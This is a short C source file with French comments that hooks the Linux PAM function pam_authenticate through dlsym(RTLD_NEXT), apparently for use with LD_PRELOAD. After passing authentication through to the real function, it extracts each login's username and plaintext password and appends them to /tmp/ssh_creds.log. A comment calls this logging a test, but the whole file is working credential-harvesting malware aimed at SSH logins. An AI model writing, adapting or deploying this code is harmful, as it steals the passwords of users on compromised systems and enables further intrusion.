#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <pthread.h>

/* Déclaration originale de la fonction pam_authenticate */
int pam_authenticate(pam_handle_t *pamh, int flags) {
    static int (*original_pam_authenticate)(pam_handle_t *, int) = NULL;
    int ret;
    const char *username = NULL;
    const void *password = NULL;
    
    /* Récupération de la fonction originale */
    if (!original_pam_authenticate) {
        original_pam_authenticate = dlsym(RTLD_NEXT, "pam_authenticate");
    }
    
    /* Appel de la fonction originale */
    ret = original_pam_authenticate(pamh, flags);
    
    /* Extraction des identifiants */
    pam_get_item(pamh, PAM_USER, (const void **)&username);
    pam_get_item(pamh, PAM_AUTHTOK, &password);
    
    /* Journalisation locale pour test */
    FILE *f = fopen("/tmp/ssh_creds.log", "a");
    if (f) {
        fprintf(f, "[SSH_CREDS] User: %s | Password: %s\n", 
                username ? username : "NULL", 
                (char *)(password ? password : "NULL"));
        fclose(f);
    }
    
    return ret;
}